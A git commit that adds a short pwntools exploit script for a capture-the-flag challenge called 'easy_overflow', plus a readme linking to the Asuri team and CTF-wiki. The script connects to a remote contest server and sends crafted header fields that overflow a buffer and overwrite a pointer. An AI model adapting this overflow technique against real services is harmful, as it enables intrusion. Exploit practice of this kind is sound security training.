17ecebb3d6a58055c48e3e1b5fe44f45afa2e3af
fantasy <3280907645@qq.com>
2018-11-11 00:43:41 -0800

    suctf-new:esof

---
+++ suctf-new/easy_overflow/exp.py
@@ -0,0 +1,14 @@
+from pwn import *
+
+# p = process("./eofs")
+p = remote("43.254.3.203" ,  10002)
+elf = ELF("./eofs")
+
+host_addr = 0x602220
+
+payload = "GET / HTTP/1.1#"
+payload += "Host:" + p64(0xDEADBEEF)*2 + "#" 
+payload += "ResearchField:" + "a"*0x60 + "#"
+payload += "ResearchField:" + "a"*0X20 + p64(host_addr) + "#"
+p.sendline(payload)
+p.interactive()
---
+++ suctf-new/easy_overflow/readme.txt
@@ -0,0 +1,3 @@
+Asuri page:https://www.asuri.org/
+Asuri github:https://github.com/Asuri-Team
+CTF-wiki:https://ctf-wiki.github.io/ctf-wiki/
